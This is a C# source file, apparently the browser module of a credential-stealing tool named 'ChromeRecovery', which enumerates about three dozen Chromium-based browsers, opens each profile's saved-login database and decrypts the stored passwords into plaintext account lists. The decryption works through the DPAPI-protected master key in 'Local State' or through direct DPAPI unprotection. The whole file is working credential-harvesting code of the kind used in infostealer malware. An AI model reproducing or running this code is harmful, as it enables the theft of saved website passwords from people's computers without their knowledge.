namespace ChromeRecovery
{
    using System;
    using System.Collections.Generic;
    using System.IO;
    using System.Security.Cryptography;
    using System.Text;
    using System.Windows.Forms;

    public class Chromium
    {
        public static string LocalApplicationData = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
        public static string ApplicationData = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);

        public static List<Account> Grab()
        {
            Dictionary<string, string> ChromiumPaths = new Dictionary<string, string>()
            {  

               {
                    "Chrome",
                    LocalApplicationData + @"\Google\Chrome\User Data"
                },
               //C:\Users\mehdi\AppData\Local\AVG\Browser\User Data
                  {
                    "AVG Browser",
                    LocalApplicationData + @"\AVG\Browser\User Data" //ADDED By Arsium
                },
                      {
                    "Kinza",
                    LocalApplicationData + @"\Kinza\User Data" //ADDED By Arsium
                },
                          {
                    "URBrowser",
                    LocalApplicationData + @"\URBrowser\User Data" //ADDED By Arsium
                },
                 {
                    "AVAST Software",
                    LocalApplicationData + @"\AVAST Software\Browser\User Data" //ADDED By Arsium
                },

                  {
                    "SalamWeb",
                    LocalApplicationData + @"\SalamWeb\User Data" //ADDED By Arsium
                },
                     {
                    "CCleaner",
                    LocalApplicationData + @"\CCleaner Browser\User Data" //ADDED By Arsium
                },

                {
                    "Opera",
                    Path.Combine(ApplicationData, @"Opera Software\Opera Stable")
                },
                {
                    "Yandex",
                    Path.Combine(LocalApplicationData, @"Yandex\YandexBrowser\User Data") //NOT WORKING
                },
                {

                    "Slimjet",
                      Path.Combine(LocalApplicationData, @"Slimjet\User Data" )
                },
                {
                    "360 Browser",
                    LocalApplicationData + @"\360Chrome\Chrome\User Data"
                },
                {
                    "Comodo Dragon",
                    Path.Combine(LocalApplicationData, @"Comodo\Dragon\User Data")
                },
                {
                    "CoolNovo",
                    Path.Combine(LocalApplicationData, @"MapleStudio\ChromePlus\User Data")
                },
                {

                    "Chromium | SRWare Iron Browser",
                      Path.Combine(LocalApplicationData, @"Chromium\User Data" )
                },
                {
                    "Torch Browser",
                    Path.Combine(LocalApplicationData, @"Torch\User Data")
                },
                {
                    "Brave Browser",
                    Path.Combine(LocalApplicationData, @"BraveSoftware\Brave-Browser\User Data")
                },
                {
                    "Iridium Browser",
                    LocalApplicationData + @"\Iridium\User Data"
                },
                {
                    "Opera Neon",
                    Path.Combine(LocalApplicationData  , @"Opera Software\Opera Neon\User Data")

                },
                {
                    "7Star",
                    Path.Combine(LocalApplicationData, @"7Star\7Star\User Data")
                },
                {
                    "Amigo",
                    Path.Combine(LocalApplicationData, @"Amigo\User Data")
                },
                {
                    "Blisk",
                    Path.Combine(LocalApplicationData  ,  @"Blisk\User Data")
                },

                {
                    "CentBrowser",
                    Path.Combine(LocalApplicationData, @"CentBrowser\User Data")
                },
                {
                    "Chedot",
                    Path.Combine(LocalApplicationData, @"Chedot\User Data")
                },
                {
                    "CocCoc",
                    Path.Combine(LocalApplicationData, @"CocCoc\Browser\User Data")
                },
                {
                    "Elements Browser",
                    Path.Combine(LocalApplicationData, @"Elements Browser\User Data")
                },
                {
                    "Epic Privacy Browser",
                    Path.Combine(LocalApplicationData, @"Epic Privacy Browser\User Data")
                },
                {
                    "Kometa",
                    Path.Combine(LocalApplicationData, @"Kometa\User Data")
                },
                {
                    "Orbitum",
                    Path.Combine(LocalApplicationData, @"Orbitum\User Data")
                },
                {

                    "Sputnik",
                    Path.Combine(LocalApplicationData, @"Sputnik\Sputnik\User Data")
                },
                {
                    "uCozMedia",
                    Path.Combine(LocalApplicationData, @"uCozMedia\Uran\User Data")
                },
                {
                    "Vivaldi",
                    Path.Combine(LocalApplicationData, @"Vivaldi\User Data")
                },
                {
                    "Sleipnir 6",
                    Path.Combine(ApplicationData, @"Fenrir Inc\Sleipnir5\setting\modules\ChromiumViewer")
                },
                {
                    "Citrio",
                    Path.Combine(LocalApplicationData, @"CatalinaGroup\Citrio\User Data")
                },
                {
                    "Coowon",
                    Path.Combine(LocalApplicationData, @"Coowon\Coowon\User Data")
                },
                {
                    "Liebao Browser",
                    Path.Combine(LocalApplicationData, @"liebao\User Data")
                },
                {
                    "QIP Surf",
                    Path.Combine(LocalApplicationData, @"QIP Surf\User Data")
                },
                {
                    "Edge Chromium",
                    Path.Combine(LocalApplicationData, @"Microsoft\Edge\User Data")
                }
            };

            var list = new List<Account>();

            foreach (var item in ChromiumPaths)
                list.AddRange(Accounts(item.Value, item.Key));

            return list;
        }

        private static List<Account> Accounts(string path, string browser, string table = "logins")
        {

            //Get all created profiles from browser path
            List<string> loginDataFiles = GetAllProfiles(path); 

            List<Account> data = new List<Account>();

            foreach (string loginFile in loginDataFiles.ToArray())
            {
                if (!File.Exists(loginFile))
                    continue;

                SQLiteHandler SQLDatabase;

                try
                {
                    SQLDatabase = new SQLiteHandler(loginFile); //Open database with Sqlite
                }
                catch (System.Exception ex)
                {
                    Console.WriteLine(ex.ToString());
                    continue;
                }

                if (!SQLDatabase.ReadTable(table)) 
                    continue;

                for (int I = 0; I <= SQLDatabase.GetRowCount() - 1; I++)
                {
                    try
                    {
                        //Get values with row number and column name
                        string host = SQLDatabase.GetValue(I, "origin_url");
                        string username = SQLDatabase.GetValue(I, "username_value");
                        string password = SQLDatabase.GetValue(I, "password_value");

                        if (password != null)
                        {
                            //check v80 password signature. its starting with v10 or v11
                            if (password.StartsWith("v10") || password.StartsWith("v11") || password.StartsWith("passw10") || password.StartsWith("w10"))
                            {
                                //Local State file located in the parent folder of profile folder.
                                byte[] masterKey = GetMasterKey(Directory.GetParent(loginFile).Parent.FullName); 

                                if (masterKey == null)
                                    continue;

                                password = DecryptWithKey(Encoding.Default.GetBytes(password), masterKey);
                            }
                            else
                                password = Decrypt(password); //Old versions using UnprotectData for decryption without any key
                        }
                        else
                            continue;

                        if (!string.IsNullOrEmpty(host) && !string.IsNullOrEmpty(username) && !string.IsNullOrEmpty(password))
                            data.Add(new Account() { URL = host, UserName = username, Password = password, Application = browser });
                    }
                    catch (Exception ex)
                    {
                        Console.WriteLine(ex.ToString());
                    }
                }
            }

            return data;
        }

        private static List<string> GetAllProfiles(string DirectoryPath)
        {
            List<string> loginDataFiles = new List<string>
            {
                DirectoryPath + @"\Default\Login Data",
                DirectoryPath + @"\Login Data"
            }; 

            if (Directory.Exists(DirectoryPath))
            {
            //   MessageBox.Show(DirectoryPath);

                foreach (string dir in Directory.GetDirectories(DirectoryPath))
                {
                    if (dir.Contains("Profile"))
                        loginDataFiles.Add(dir + @"\Login Data");
                }
            }

            return loginDataFiles;
        }

        public static string DecryptWithKey(byte[] encryptedData, byte[] MasterKey)
        {
            byte[] iv = new byte[] { 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0 }; // IV 12 bytes

            //trim first 3 bytes(signature "v10") and take 12 bytes after signature.
            Array.Copy(encryptedData, 3, iv, 0, 12);

            try
            {
                //encryptedData without IV
                byte[] Buffer = new byte[encryptedData.Length - 15];
                Array.Copy(encryptedData, 15, Buffer, 0, encryptedData.Length - 15);

                byte[] tag = new byte[16]; //AuthTag
                byte[] data = new byte[Buffer.Length - tag.Length]; //Encrypted Data

                //Last 16 bytes for tag
                Array.Copy(Buffer, Buffer.Length - 16, tag, 0, 16);

                //encrypted password
                Array.Copy(Buffer, 0, data, 0, Buffer.Length - tag.Length);

                AesGcm aesDecryptor = new AesGcm();
                var result = Encoding.UTF8.GetString(aesDecryptor.Decrypt(MasterKey, iv, null, data, tag));

                return result;
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex.ToString());
                return null;
            }
        }

        public static byte[] GetMasterKey(string LocalStateFolder)
        {
            //Key saved in Local State file
            string filePath = LocalStateFolder + @"\Local State";
            byte[] masterKey = new byte[] { };

            if (File.Exists(filePath) == false)
                return null;

            //Get key with regex.
            var pattern = new System.Text.RegularExpressions.Regex("\"encrypted_key\":\"(.*?)\"", System.Text.RegularExpressions.RegexOptions.Compiled).Matches(File.ReadAllText(filePath));

            foreach (System.Text.RegularExpressions.Match prof in pattern)
            {
                if (prof.Success)
                    masterKey = Convert.FromBase64String((prof.Groups[1].Value)); //Decode base64
            }

            //Trim first 5 bytes. Its signature "DPAPI"
            byte[] temp = new byte[masterKey.Length - 5];
            Array.Copy(masterKey, 5, temp, 0, masterKey.Length - 5);

            try
            {
                return ProtectedData.Unprotect(temp, null, DataProtectionScope.CurrentUser);
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex.ToString());
                return null;
            }
        }

        public static string Decrypt(string encryptedData)
        {
            if (encryptedData == null || encryptedData.Length == 0)
                return null;
            try
            {
                return Encoding.UTF8.GetString(ProtectedData.Unprotect(Encoding.Default.GetBytes(encryptedData), null, DataProtectionScope.CurrentUser));
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex.ToString());
                return null;
            }
        }
    }
}